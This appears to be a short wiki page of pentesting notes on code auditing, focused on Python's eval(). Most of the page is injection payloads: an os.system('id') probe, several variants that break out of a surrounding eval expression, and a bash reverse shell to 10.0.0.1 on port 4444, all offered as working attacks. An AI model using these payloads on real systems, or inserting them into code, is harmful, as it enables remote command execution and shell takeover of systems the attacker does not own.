---
title: Code Auditing
description: Unsafe Functions and Constructions Grouped by Language
published: true
date: 2023-11-24T01:43:10.262Z
tags: injection, code, reversing
editor: markdown
dateCreated: 2023-11-24T01:43:10.262Z
---

# Code Auditing
If you have access to scripts, you need to see if the code is running anything unsafe. Grouped by language, then unsafe implementation

## Python
`eval()` -  Allows execution of arbitrary user input. May need to have a bypass injected:
```python
# Diagnose with an id command
__import__('os').system('id')

<!-- Bypass another expression in eval -->
),__import__('os').system('id')
'),__import__('os').system('id')
},__import__('os').system('id')
),__import__('os').system('id')#

# Catch a shell
__import__('os').system('bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"')
```
